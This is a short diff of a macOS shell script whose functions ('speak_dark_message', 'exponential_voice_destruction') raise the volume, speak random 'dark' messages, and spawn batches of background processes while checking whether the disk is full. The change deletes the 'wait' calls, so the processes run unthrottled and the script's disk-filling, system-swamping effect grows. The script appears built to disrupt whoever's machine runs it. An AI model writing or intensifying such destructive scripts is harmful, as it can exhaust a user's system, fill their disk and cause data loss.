@@ -66,7 +66,7 @@ speak_dark_message() {
     local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
     osascript -e "set volume output volume 90" 2>/dev/null || true
     say "$dark_msg" 2>/dev/null
-    wait
+
 }
 
 # PROFESSIONAL LIGHTNING SPEED DESTRUCTION
@@ -119,9 +119,7 @@ exponential_voice_destruction() {
                     fi
                 ) &
             done
-            
-            # Wait for massive batch to complete instantly
-            wait
+
             
             # Check disk full
             if [[ $? -ne 0 ]]; then
